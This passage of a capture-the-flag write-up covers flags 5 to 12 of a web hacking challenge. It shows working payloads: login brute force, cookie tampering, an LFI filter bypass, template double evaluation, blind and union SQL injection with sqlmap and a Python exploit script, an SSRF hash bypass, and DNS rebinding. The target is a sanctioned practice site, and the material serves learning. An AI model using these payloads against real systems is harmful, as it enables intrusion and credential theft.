So for this flag we will have to find a way to get past the login page, and access the secret area. When we open the application, a login page where we must enter a username and password, in order to log in, is displayed. If we enter the username "admin" with the password "admin", the following message is displayed back to the user: `Invalid Username`. Since only the username is mention in the message displayed back to the user, this application may give another error message for a valid user. If this is the case we can distinguish between a valid user and an invalid user. That means we can find a valid user and launch a password brute force attack against the user, and if we are lucky gain access to the secret area. Lets give it a try! We fire up FFuF again to do a brute force attack against the username to check if we are able to discover any valid users:

{F1138764}

In this run with FFuF we use the -fr option to filter out the regular expression "Invalid Username". This means that each result that is returned from FFuF does not contain the specified regular expression. From the result we see that the username `access` will respond with something other than "Invalid Username" in the response. If we try to login manually via the browser with the username "access" and a random password, the application will now return the message: `Invalid Password`. If we now run FFuF again, but change the fuzz location to the password field with the username set equal to "access", we can brute force the password of the access user:

{F1138762}

So the username / password combination of `access / computer` will result in a 302 redirect from the server. If we try the discovered credentials in the browser, the 302 redirect from the server will set an access cookie named "secure-login" and redirect back to "/secure-login". Now, since we are logged in, the page will show a table with secure files that the user can download:

{F1138763}

The page says that there is no files to download, maybe if we could become another user there would be some files for us to download.

If we look closely at the secure-login cookie, the value starts with a familiar "ey" pattern. This value is not only base64 encoded, it is also URL encoded. So if we are to retrieve the correct decoded value we must first URL decode before we base64 decode the value in order to preserve the correct value. After decoding our secure-login cookie we end up with the following JSON object:

```
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```

The admin property of the cookie is set to false, pretty interesting. Let us check what happens if we change the value from false to true, base64 encode it and then URL encode it. We end up with the following value: 

```
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQo%3D
```

If we change the secure-login cookie to this new value, via the browsers developer tools, we get the following result when refreshing the page: 

{F1138765}

Ok, so we now got a file to download. Let us download the file and check the content of the zip file. By clicking the link in the table, the "my_secure_files_not_for_you.zip" file is downloaded. But when we try to extract the file via `unzip my_secure_files_not_for_you.zip` we are prompted for a password. 

Ok, so we need to crack the password on the zip file. We can do this by using the [fcrackzip](https://github.com/hyc/fcrackzip) utility with the rockyou.txt wordlist. By running frackzip towards this downloaded zip file, with the rockyou.txt wordlist as input, we get the following result:

{F1138766}

From the result we see that the password is: `hahahaha`. So if we now try to unzip the file with unzip again and enter the password, two files are now extracted. The first file is an image with the name XXX.png. Please cover the eyes of any children near the screen before you scroll down:

{F1138767}


And the second file is the flag.txt file that contains the 5th flag.


Flag 5 is: `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`

* * * 

## Flag 6 - My Diary

**Mission brief:**
`Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?`

So we need to hack the Grinchs diary to retrieve and find his upcoming event. Upon browsing to the URL `https://hackyholidays.h1ctf.com/my-diary/` we are immediately redirected to `https://hackyholidays.h1ctf.com/my-diary/?template=entries.html`. The template parameter looks really interesting and may hint to a Local File Inclusion vulnerability. Let us do a short content discovery with FFuF to see if there are any other interesting files on the server.

{F1138768}

If we browse to the index.php via the URL `https://hackyholidays.h1ctf.com/my-diary/index.php`, the server will just redirect us back to the main page. Let see if the template parameter may be vulnerable by changing the value from `entries.html` to `index.php` instead. When we open the following URL: `https://hackyholidays.h1ctf.com/my-diary/?template=index.php`, the browser will just display a blank page, but if we inspect the page with developer tools or look at the HTTP response in Burp, we discover the following PHP code is returned in the HTTP response:


```
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

If we analyze the PHP file we find that the code does the following: 

1. Fetch the template parameter from the request and store it inside the $page variable
2. For every character in the $page variable that is not in the set a-z, A-Z, 0-9 or dot, replace them with nothing and store this result in the $page variable.
3. For every instance of the string `admin.php` in the $page variable, replace it with nothing and store this result in the $page variable.
4. For every instance of the string `secretadmin.php` in the $page variable, replace it with nothing and store the result in the $page variable. 
5. Finally the script will check if the location in the $page variable exist in a file on disk, if it does, the content of the file will be returned. If not the user is redirected back to the main page.

Note the comment above the line that replaces secretadmin.php in the index.php file. It seems that the Grinch have moved the amdin.php file to secretadmin.php, so that is the file we should try to read. We can do this by navigating to the URL: `https://hackyholidays.h1ctf.com/my-diary/secretadmin.php` in the browser. This results in a page that display the message `You cannot view this page from your IP Address`. Ok, so we will have to find another way to read this file. 

Let us go back to the index.php file we manage to download. If we are able to construct a string, that when the regex run against it, will result in setting the $page variable to `secretadmin.php`, we should be able to read the content of secretadmin.php file. By playing a little bit with the input to the template parameter we find that the string `secretadminsecretadminadmin.php.phpadmin.php.php` is able to bypass the check and read the content of secretadmin.php. That means we can navigate to the following URL:  `https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadminadmin.php.phpadmin.php.php` and we are able to browse the Grinchs calendar and see that on the 23rd of December he has scheduled an event to "Launch DDoS Against Santa's Workshop!". Let us hope we are able to stop his attack in time!

The page will also show the 6th flag:

{F1138769}

Flag 6 is: `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`

* * * 
## Flag 7 - Hate Mail Generator
**Mission Brief**: 
`Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!`

Upon launching the Hate Mail Generator application we see a page with a list of one previous (Hate) mail campaign and the ability to create a new campaign. By clicking the name of the old campaign we can see the name, subject and markup of the campaign. 

The markup is set to: 

```
{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```
It is very interesting that the campaign contains the ability to include a template via the `{{template:<TEMPLATE NAME>}}`, let us make a note of that and we will probably come back this later.

The application also supports to preview a template, this feature can be accessed by clicking the "preview button" on an old campaign. The template will then be rendered and displayed back to the user. 

On the front page there is also the button to create a new campaign. If we start a new campaign we are able to add a name, subject and markup for the template. If we click the "create" button, on the new campaign page, we get a message saying that we are out of credits. So we can not create any new campaigns, however we are able to enter the markup and preview our campaign.

Before we try anything else, it would be good idea to do a regular content discovery with FFuF to check again for any hidden files on the server that the web application may not be linking to. We run FFuF with the common.txt file against the Hate Mail Generator application: 

{F1138770}

So we found a template folder, if we browse this folder we find the following 3 templates:

1. cbdj3_grinch_header.html   
2. cbdj3_grinch_footer.html
3. 38dhs_admins_only_header.html

The first two looks pretty generic, but template number 3 named "38dhs_admins_only_header.html" looks very interesting. If we try to open the template in the browser we just get a 403 Forbidden response from the server. Maybe if we could include the template via the template-include tag, we could read the template file.

If we create a new template with the following markup: 

```
Hello {{template:38dhs_admins_only_header.html}} 
```

And then click the preview button, we get a message from the server saying: "You do not have access to the file 38dhs_admins_only_header.html". So this can not be the right way. When I hack on template systems, there is always a comic that pops up in the back of my hacker mind, and it is this one:

{F1138771}

So if we can make the application double evaluate our tag, maybe we can force it to read the "38dhs_admins_only_header.html" file, even though we do not have access. If we inspect the request we just made to the preview page of our new campaign closely, we find some URL encoded parameters, and if we URL decode them we get the following:

```
preview_markup=Hello {{template:38dhs_admins_only_header.html}} &preview_data={"name":"Alice","email":"alice@test.com"}
```

So the request that goes to the server contains the preview_data JSON object, that contains the data that probably is used when rendering the application. So if we are to perform a double evaluation, we can add a new variable, say "webhak", and set that variable to the following value: `{{template:38dhs_admins_only_header.html}}`, and then in the markup we render the webhak value like this `Hello {{webhak}}`. The request POST data looks like this, before url encoding:

```
preview_markup=Hello , {{webhak}} &preview_data={"name":"Alice", "webhak":"{{template:38dhs_admins_only_header.html}}" }
```

The server will then respond with the following page that contains the flag:

{F1138772}

Flag 7 is: `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`

* * *

## Flag 8 - Forum
**Mission brief:** `The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!`

This was a particular hard challenge if you did not proceed through the right steps. I waste some time on this challenge going down a couple of rabbit holes, but manage to solve it in the end.

When you open the main page you see a list of forums and and message saying that we need to be admin to see these posts. There is also a login button in the top corner that will lead us to the login page. When we browse the application we find some posts in the Christmas forum, but nothing on the pages sticks out or screams vulnerable. 

As usual, I like to run FFuF to see if there is anything the application is not linking to, but may be available upon directly navigating to the file or endpoint:

{F1138773}

When running FFuf we discover the `/phpmyadmin` endpoint, which returns another login page when we browse to it, this seems interesting. If we run a brute force attack with common login credentials, it yields no valid results.

After spending quite some time trying to find an attack vector on an application and looking at it from different angles without finding anything, it can sometimes be smart to take a large step back. A good thing to do is to do some recon and check Google and Github for the organization that may have created the application you are hacking. In some cases you might find the source code of the application, which you may be able to find a vulnerability in by doing some code review. 

By checking Github, we find that the "Grinch Networks" actually has a Github page: [https://github.com/Grinch-Networks](https://github.com/Grinch-Networks) that looks like an organization page for something called "Grinch-Networks" and one repository named "forum" available - [https://github.com/Grinch-Networks/forum](https://github.com/Grinch-Networks/forum). If we check the [commit history](https://github.com/Grinch-Networks/forum/commits/main) for the repository, wee see that there is 4 commits. The commit with the comment "Small fix" stands a bit out and by browsing to the commit changelog here [https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae](https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae), we can see that somebody checked in some credentials for the database, then tried to remove them. However they were only deleted from the source code, not the git history. 

The user name is `forum` and the password is `6HgeAZ0qC9T6CQIqJpD`. These credentials are not valid on the main application login page, but they are valid on the phpmyadmin login page. By logging in to the PHP myadmin application and by navigating to forum -> user ([https://hackyholidays.h1ctf.com/forum/phpmyadmin?db=forum&table=user](https://hackyholidays.h1ctf.com/forum/phpmyadmin?db=forum&table=user)) we find the following set of information:

| id | username | password | admin |
| -- | -------- | -------- | ----- |
| 1	| grinch | 35D652126CA1706B59DB02C93E0C9FBF	| 1 |
| 2	| max	| 388E015BC43980947FCE0E5DB16481D1 | |

The password column really looks like some kind of hash, so if we can crack one of them we may gain entry to the forum application. This is the result of running both hashes through [https://crackstation.net/](crackstation.net). 

{F1138774}

So the user `grinch` should have the password `BahHumbug`. If we then navigate to the forum login page, located at [https://hackyholidays.h1ctf.com/forum/login](https://hackyholidays.h1ctf.com/forum/login), we can now log in as the grinch with these credentials, and in the admin section ([https://hackyholidays.h1ctf.com/forum/3/2](https://hackyholidays.h1ctf.com/forum/3/2)) we will find the flag and the grinchs secret plan:

{F1138775}

As we can read from the forum post, the Grinch is looking for his IP addresses in order to launch a DDoS attack! Hopefully we will be able to take him down before he does so!

Flag 8 is: `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`

* * * 

## Flag 9 - Evil Quiz
**Mission brief:** `Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!`

Navigating the browser to the evil quiz application, the following page is displayed to us: 

{F1138776}

In the top right there is a button to log in to the admin application. To access any other part of the application, the user must first enter a name and submit it to the application. By submitting a name we are now allowed to access the quiz. If we submit the quiz, by clicking the finish button, the user is now navigated to the last page of the application, the score page. The score page will display your name, your quiz score and number of other players with the same name as you. 

The name of the user is the only input field that the application are expecting from the user, so this is probably where we should focus our effort. If we change then name of the user, we can try to enter the following payload to look for a SQL-injection, at the first screen: `hopefullyNoOneElseHasThisUsername' or 1=1 -- ` (there must be a space after the two dashes). If we submit the name and navigate to the score page of the application we observe that the application returns a message saying that "There is XXX other player(s) with the same name as you!", where XXX is replaced by a pretty large number. If we change the name to `hopefullyNoOneElseHasThisUsername' or 1=2 -- `, and the open the score page again, we observe that there is now always 0 other player(s) with the same name. This is a strong indicator that we have a blind sql injection vulnerability that we probably can exploit, since we can trigger a conditional response. We will skip the background on how to exploit such a vulnerability, if anyone is interested in more about the subject, I recommend the [Blind SQL  injection](https://portswigger.net/web-security/sql-injection/blind) article on Portswigger. 


To exploit this vulnerability we can create a Python script to perform a brute force of some content in the database for us. The appendix section have the Python script listed as flag9-solver.py. Since this server is a bit slow, we need to be a little bit smart of what information we want to dump from the database, to try to avoid dumping the whole database. The database server is probably MySQL, so if we query the "information_schema.tables" table, and order the results descending by the table create_time, we can pick the newest created table, since this is probably the most interesting. In MySQL it is possible to pick the latest created table like this: 

```
select table_name from information_schema.tables order by create_time desc limit 0,1;
```

We use this technique in the "get_latest_created_table_name" function of the flag9-solver.py script. The script will dump the content of the latest created table. When we run the Python script we get the following output:

{F1138778}

So the latest created table in the database is the "admin" table, and the content of looks like this: 

| id | username | password |
| -- | -------- | -------- |
| 1  | admin | S3creT_p4ssw0rd-$ |


So now we have a set of admin credentials, this is very interesting. By using these credentials we are able to login into the admin area of the Evil Quiz application. When we login with the credentials we are greeted with the admin area of the Evil quiz application that contains the flag:

{F1138779}


Flag 9 is: `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`

* * * 

## Flag 10 - Signup Manager
**Mission brief:** 
`You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!`

One potential way to infiltrate the Grinchs network and stop the DDoS attack against Santa servers is that we could get recruited into the Grinchs army. We could then gather some intelligence on the servers and techniques that they are planning on using, and possibly stop him and his army from taking down Satan! We are probably getting closer, so let us check what we can do with the signup manager.

As usually we start out with a content discovery with FFuF and the commons.txt from SecLists:

{F1138780}

These files do not look that interesting. The index.php file is the main page of the application, and the admin.php gives a message: `You cannot access this page directly`. So we are not able to access the admin page by just browsing to it.

By viewing the source of the index.php file we find the following comment: `<!-- See README.md for assistance -->`. Readme files are usually very interesting because they will sometime contain information on what product the site is running, what framework and which version, and similar information. This can usually be used to narrow down what kind of attacks are available. So if we browse to [https://hackyholidays.h1ctf.com/signup-manager/README.md](https://hackyholidays.h1ctf.com/signup-manager/README.md) we can download the README.md file for the signup manager. The file contains the following: 

```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y
7b) Default login is admin / password
```

Our first attempt was to log in with the default admin credentials from the README.md file, admin / password. These credentials are valid, but will only redirect us to the user area. If we are to become part of the Grinch army, we must access the admin area. So let us take a step back!

According to the README.md file there users are stored inside of a users.txt file, but the readme states that it is supposed to be in a folder that the cannot be read from the website visitors, let us check if the site administrator may have forgotten to move the users.txt file:

{F1138781}

A 404 page means that the file does not exists, so it looks like the site administrator followed the readme. Maybe the administrator have forgotten to delete the signupmanager.zip file that may contain the source code of the software running. So by navigating to [https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip](https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip) we are able to download the .zip file containing the source.

One of the things that stood out in the README.md file was item number 6: `You can make anyone an admin by changing the last character in the users.txt file to a Y`. That is interesting! If we can change the last character that is inserted into users.txt into a 'Y', we may just be able to access the admin area of the signup manager.

By getting a bit familiar with the code, we find no obvious vulnerabilities. A detailed review of the code that stores the user in users.txt file may be necessary to find anything interesting. The function that stores the user is available in index.php on line 26 and is called `addUser`, and looks like this:

```php
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
```

By reviewing the code we see how the user is stored in the users.txt file. If we can make some part of the string, before the 'N' is appended, one char longer than it is expected to be, we should be able to insert an 'Y' in the last position of the lastname, and it will overflow into the char that decides if the user is an administrator or not.  

The code will append the $line variable to the users.txt file. The $line variable consists of the username, padded to 15 characters, then the password, which is MD5 hash of the password, which is 32 characters. The age is then added and padded to 3 chars. Then firstname and lastname is appended, both padded to 15 chars. And then the last line is doing a substring of $line, choosing 113 chars, starting from position 0 (start of string). 

So, if we are able to ensure that the variable $line has an Y at end of it, when it is written to the users.txt file, we should be able to become admin. To do this we need to "overflow" the string, by setting the lastnames last char to an 'Y' and getting the line variable to shift one position. 

If we follow the signup flow from the code in index.php, we can see that on line 85: The POST parameter `age` is validated: 

```php
if (!is_numeric($_POST["age"])) {
	$errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
	$errors[] = 'Age entered is too long';
}
$age = intval($_POST["age"]);
if (count($errors) === 0) {
	$cookie = addUser($username, $password, $age, $firstname, $lastname);
	setcookie('token', $cookie, time() + 3600);
	header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
	exit();
}
```

There is two checks in place on the "age" property. First the `is_numeric` function is called with the age property, this function checks if a string passed to it is a valid number or numeric string. The second test is to check if the length of the age property is longer than three characters. If the age property is four chars or longer, an error will be thrown. After these two check, the `intval` function is called with the age property to convert the value into a number. 

If there exists a string that does not contain more than three characters, but can be converted to a number that will take up four characters when converted via the `intval` function, we can overflow the last char of the "lastname" parameter and that will be shifted one position over, such that it is the last char that will be stored in users.txt.

This can be done by using "E notation" in PHP. Consider the following numbers: 

```
6 x 10^2 = 600
6 x 10^3 = 6000
```

In many programming languages (including PHP) the numbers above can be represented in the following way:

```
6e2 = 600
6e3 = 6000
```

So by setting our age to `6e3` our input should get passed the validation of age, length is not above three characters and the value is numeric, but resulting value will take up four characters when inserted into the users.txt file, hence overflowing the last Y in our lastname to the position of the char that decides if the user is an administrator or not. 

So we intercept the POST request for registering our user, and set the lastname to the value `FFFFFFFFFFFFFFY` and our age to `6e3`, we should be added to the users.txt file as an admin. The full request looks like this: 


{F1138782}

We can then open the front page and login in with the credentials we used when we sent the POST request. We can see that our attack succeeded and we are finally in the admin area of the application:


{F1138783}


Flag 10 is: `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`

* * * 

## Flag 11 - r3c0n_server_4fdk59
When we successfully added us as an administrator and logged into the Signup manager, we got the flag 10 and a link to the next challenge. The links points to the following URL: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59. 

To get a foothold on the server, we start by running FFuF, with the common.txt file from SecLists, to find any interesting files or folders: 

{F1138784}

The /api path looks pretty interesting, and by navigating to /api we find the documentation for the API.

{F1138785}

This looks pretty interesting. So if we navigate to `r3c0n_server_4fdk59/api/ENDPOINTNAME` we should be able to access the API. When we browse to any endpoints, we get a message that `{"error":"This endpoint cannot be visited from this IP address"}`. So if we are going to call the API, we will have to bypass the IP restriction. Maybe we can find a way to make the box do the request for us. 


By browsing the application, we find that the application has two main features. The first feature is to display the photo albums and the second feature is to display the images in the photo albums. 

By poking at the hash parameter on the album endpoint, we find that it is vulnerable to an SQL injection, we can dump the two tables that looks interesting in the recon database by running:

```
sqlmap -u "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k" -p hash --dbms mysql  -T photo,album -dump 
```

We find nothing interesting in the database, so there must be something else.


```
Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+

Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+

```

If we look closely at the images, that the album page returns, we see that the picture endpoint takes a data parameter that always starts with "ey", again, this is usually and indication that the data is base64 encoded JSON. So if we take one image urls: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9` and we base64 decode the value of the data parameter we get:

```
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```

This looks very interesting. If we change the image URL, we may be able to perform a Server Side Request Forgery (SSRF) attack against the API, which in this case will make the API request come directly from the r3c0n server, and not from our IP. This may let us bypass the IP restriction on the API. Let us change the image property of the JSON object from `r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg` to `r3c0n_server_4fdk59\/api` and encode the the whole JSON object with base64 again. This will produce the following encoded data:

```
eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL2FwaSIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
```

And if we append it to the URL we get:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL2FwaSIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
```

When we request the URL we get the following message: `invalid authentication hash`. So, there is some kind of authentication going on here. We will probably need to bypass that. 

Since the "hash" parameter on the albums page is vulnerable to a SQL injection, maybe we can influence the query in some way, and change the image URL in the JSON object and get the server to generate a valid hash for that new URL.

By exploiting the SQL injection using a union based query, we are able to modify the image path. The following value, sent to the album endpoint via the hash parameter, will result in modifying the image path:

```
a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

This query, will change the image path of in the returned JSON data object that is then sent to the picture endpoint. We can observe it by browsing to the following URL:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

If we base64 decode the data parameter sent to the picture endpoint now, we see that it has changed to the following:

```
{"image":"r3c0n_server_4fdk59\/uploads\/..\/api","auth":"38122d477657c1a0c9ba873c11017497"}
```

Now we are able to do a directory traversal via the image path, and the server will generate the hash for us. To make the testing a little easier we can use the following Python script to send a request with our chosen path, and get the data decoded and the HTTP response code and body from the picture request:

```python
import requests
import sys
from bs4 import BeautifulSoup
import base64

if len(sys.argv) != 2:
    print("(-) Usage: {} <PATH>".format(sys.argv[0]))
    sys.exit(1)

url ="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT \"2' UNION SELECT 1,1,'{}' --+-\",1,1--+-".format(sys.argv[1])
response = requests.get(url) 
soup = BeautifulSoup(response.text, 'html.parser')
all_img = soup.find_all(class_="img-responsive")
interesting_image_src = all_img[1]['src']

data_content = base64.b64decode(interesting_image_src.split("?")[1].split("data")[1]).decode("utf-8")

image_url = "https://hackyholidays.h1ctf.com{}".format(interesting_image_src)
image_resp = requests.get(image_url)

print("{} - {} - {}".format(image_resp.status_code, data_content, image_resp.text))
```

We supply the script with the path that we would like generate a valid request towards, the script will then make the request and perform the union based sql injection, in order to modify the path and generate a valid hash. It will then perform the request for the image and it will print out the response code from the image request, the content of the data parameter (base64 decoded such that we are able to read the content) and the response text from the image.

If we look back at the API documentation we see that API will return a 404 response code when a request towards an endpoint that does not exists, it will return a 204 when you have a valid request, but no data is returned from the endpoint. The API will also return a 400 response when a invalid GET or POST request parameter is added. We can exploit these properties with the above script in order to infer information about the back-end. By running the script with the following paths: 

{F1138785}

We see that when we request the path "../api/endpoint" the picture endpoint will respond with the message "Expected HTTP status 200, Received: 404". So the request to "/api/endpoint" return a HTTP status code of 404. By playing around with this we can fuzz some common names of the API endpoints, and that is how we discover the "/api/user" endpoint. When we call the above script with "/api/user" we get a message of "Invalid content type detected", so this endpoint returns something else than the others who return 404. 

If we start to add parameters from to the "/api/user" endpoint we discover that adding a parameter of the name "test" the request results in a 400 response, and as the API documentation states, this is an "Invalid GET/POST variable". So if we fuzz the parameter name we find that both "username" and "password" are parameters that will results in a 204 response from the endpoint. It seems that the endpoint is vulnerable to a "Wilcard SQL LIKE"-injection attack. This means that the back-end query of the API is something like this:

```
SELECT * from users where username like '<USERINPUT>' and password like '<USERINPUT>'
```

The "%" operator in SQL is equivalent to any string of zero or more characters. If we send a request with the username parameter set equal to "a%" the API will return 204 if there exists no such user, and a 400 (Invalid content type) if the condition is valid. This is illustrated in the previous screenshot by submitting a query where the username is "a%" and a query where the username is set to "%g". So it looks like the username starts with a "g". 

To brute force the username and password would require a couple of requests, doing this by hand is a bit cumbersome. So we can create a small Python script to do the brute force for us. The python script is attached to the appendix section as flag11-bf.py. If we run the script we get the following output:

{F1138787}

The script is successfully able to brute force the username and password. This results in the username `grinchadmin` and the password `s4nt4sucks`. If we then navigate to the login page of the "attack box", that is linked to on the front page of the r3c0n server, and login with the credentials, we will see the following page:

{F1138788}

Flag 11 is: `flag{07a03135-9778-4dee-a83c-7ec330728e72}`

* * * 

## Flag 12 - Attack box
Now that we have access to the Grinch network attack server, we must find a way to take it down, in order to stop the Grinch from launching his DDoS attack against Santa servers.

When one of the attack links is clicked, an URL like this is sent to the server:

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

This will then launch an attack against the designated IP. If we focus our attention on the URL, we find the familiar "ey" pattern, so let us base64 decode the payload:

```
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

Ok, so the target information is encoded in the payload. Let us try to launch a DDoS attack against 127.0.0.1 and see if we can take down the server. We first change the payload to this:

```
{"target":"127.0.0.1","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

We then base64 encode it and append it to the URL. So we end up with this: `https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==`

If we open the URL, we get the following message: `Invalid Protection Hash`. So again the payload is protected by some kind of hash. 

The hash inside the JSON object looks like an MD5 hash, but the IP-address may be salted with a secret value before the MD5 sum is calculated. This may explain why neither Google or Crackstation is able to return the cleartext value of the hash. If we are going to crack the hash, we will need find the secret value. 

To find the secret value we can create a small Python script to prefix a word, from a wordlist, to the IP address. The script is listed in the appendix section named "md5cracker.py". The script stores each of the discovered hashes, and each of the valid IPs. It will then run through the wordlist and take the word from the wordlist, and append the ip to the word. It then calculates the MD5 hash of that string, and checks if the resulting hash is in the list of known hashes. If we run the script against the rockyou.txt wordlist (found in the Seclist project), we get the following result:

{F1138789}

This means that the IP is prefixed with the secret word `mrgrinch463` before it is MD5 hashed. Now we can test out if we can launch an attack on an IP of our choice, since we can calculate a valid hash for the target we would like the server to attack. Time to take the down the Grinchs network! 

We can now direct the server to 127.0.0.1 instead by calculating the md5 hash of the string "mrgrinch463127.0.0.1", which results in: "3e3f8df1658372edf0214e202acb460b". We then base64 encode the following payload

```
{"target":"127.0.0.1", "hash":"3e3f8df1658372edf0214e202acb460b"}
```

And append it to the URL like this:

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCAiaGFzaCI6IjNlM2Y4ZGYxNjU4MzcyZWRmMDIxNGUyMDJhY2I0NjBiIn0=
```

We end up with the following results from the server:

{F1138792}

So in order to take down the server we must find a hosts that can bypass the detection of local targets, but still resolve to the attacking server. This sound very much like DNS rebinding. 

DNS rebinding is a very interesting attack. In practical terms it will let one host resolve to multiple IPs. A good tool to test for DNS rebinding attacks is this project on github: [https://github.com/taviso/rbndr](https://github.com/taviso/rbndr). From the README.md file we can see that the way to create a valid dns-rebinding host is like this:
```
<ipv4 in base-16>.<ipv4 in base-16>.rbndr.us
```

So if we take 127.0.0.1 and convert the address to hex we get "7f000001", and if we do the same for 203.0.113.33 we get "cb007121". If we put this together we get the following host that we can include in our payload: 

```
7f000001.cb007121.rbndr.us
```

We then create the payload and calculate the hash for the payload: 

```
{"target":"7f000001.cb007121.rbndr.us","hash":"54171d97f5299ef84c1c01a676eaa917"}
```

We base64 encode the payload and add it to the payload parameter in the URL. The full attack URL then looks like this:

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jYjAwNzEyMS5yYm5kci51cyIsICJoYXNoIjoiNTQxNzFkOTdmNTI5OWVmODRjMWMwMWE2NzZlYWE5MTcifQ==
```

We can launch the attack by opening the URL in the browser, and the result looks like this:


{F1138793}

